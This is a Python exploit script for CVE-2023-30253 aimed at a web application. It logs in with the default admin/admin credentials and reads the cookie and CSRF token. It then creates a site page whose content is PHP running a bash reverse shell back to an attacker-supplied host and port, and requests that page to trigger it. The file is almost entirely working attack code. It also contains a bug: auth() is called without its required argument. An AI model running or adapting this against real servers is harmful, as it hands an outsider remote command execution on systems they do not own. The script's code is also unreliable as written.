import argparse
import requests
import sys
import uuid
from bs4 import BeautifulSoup
from random import randint

# Configurar o ArgumentParser para aceitar argumentos de linha de comando
parser = argparse.ArgumentParser(description='Exploit for CVE-2023-30253')
parser.add_argument('-lhost', action='store', dest='lhost', required=True, help='Local Host (this host will receive the shell)')
parser.add_argument('-lport', action='store', dest='lport', required=True, help='Local PORT')
parser.add_argument('-rhost', action='store', dest='rhost', required=True, help='Rhost url, example: http://site.com/')
args = parser.parse_args()

def auth(rhost):

    url = f'{rhost}'
    
    r = requests.get(f'{url}')

    # Get Cookie
    header = r.headers
    cookie = header['Set-Cookie'].split(';')[0]
    
    # Get CSRF Token
    soup = BeautifulSoup(r.text, 'html.parser')
    soup = soup.find_all('meta')[4]
    csrf = soup.get('content')
    
    return cookie, csrf

def exploit(lhost, rhost, lport):

    url = f'{rhost}'
    print(auth(url))
    cookie, csrf = auth()
    params = {'token': f'{csrf}', 'actionlogin': 'login', 'username': 'admin', 'password': 'admin'}
    headers = {'Cookie': f'{cookie}'}

    name_generator = uuid.uuid4()
    id_generator = randint(1, 100)

    # Files
    files_createsite = {'token': (None, f'{csrf}'), 'action': (None, 'addsite'), 'website': (None, f'{name_generator}'), 'WEBSITE_REF': (None, f'{name_generator}'), 'WEBSITE_LANG': (None, 'en'), 'addcontainer': (None, 'Create')}
    files_createpage = {'token': (None, f'{csrf}'), 'action': (None, 'addcontainer'), 'website': (None, f'{name_generator}'), 'pageidbis': (None, '-1'), 'pageid': (None, f'{id_generator}'),'radiocreatefrom': (None, 'checkboxcreatemanually'), 'WEBSITE_TYPE_CONTAINER': (None, 'page'),'sample': (None, 'empty'),'WEBSITE_TITLE': (None, f'{name_generator}'),'WEBSITE_PAGENAME': (None, f'{name_generator}'),'WEBSITE_LANG': (None, '0'),'pageidbis': (None, '-1'),'pageidfortranslation': (None, '-1'),'WEBSITE_AUTHORALIAS': (None, ''),'datecreation': (None, '06/19/2024'),'datecreationday': (None, '19'),'datecreationmonth': (None, '06'),'datecreationyear': (None, '2024'),'datecreationhour': (None, '07'),'datecreationmin': (None, '42'),'addcontainer': (None, 'Create'),'grabimages': (None, '1'),'grabimagesinto': (None, 'root')}
    http_payload = f'<section id="mysection1" contenteditable="true">\n<?PHP system("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'");?>\n</section>\n'
    files_exploit = {'token': (None, f'{csrf}'),'action': (None, 'updatesource'),'website': (None, f'{name_generator}'),'pageid': (None, f'{id_generator}'),'update': (None, 'Save'),'PAGE_CONTENT_x': (None, '27'),'PAGE_CONTENT_y': (None, '3'),'PAGE_CONTENT': (None, f'{http_payload}')}

    requests.post(f'{url}index.php?mainmenu=home', headers={'Cookie': f'{cookie}'}, data=params, allow_redirects=False)
    requests.post(f'{url}website/index.php', headers=headers, files=files_createsite, allow_redirects=False)
    requests.post(f'{url}website/index.php', headers=headers, files=files_createpage, allow_redirects=False)
    requests.post(f'{url}website/index.php', headers=headers, files=files_exploit, allow_redirects=False)
    requests.get(f'{url}website/index.php?action=setwebsiteonline&token={csrf}&website=&websitepage=0', headers=headers, allow_redirects=False)
    requests.get(f'{url}website/index.php?website={name_generator}&pageid={id_generator}&action=setshowsubcontainers&token={csrf}', headers=headers, allow_redirects=False)
    requests.get(f'{url}website/index.php?website={name_generator}&pageid={id_generator}', headers=headers, allow_redirects=False)

exploit(args.lhost, args.rhost, args.lport)
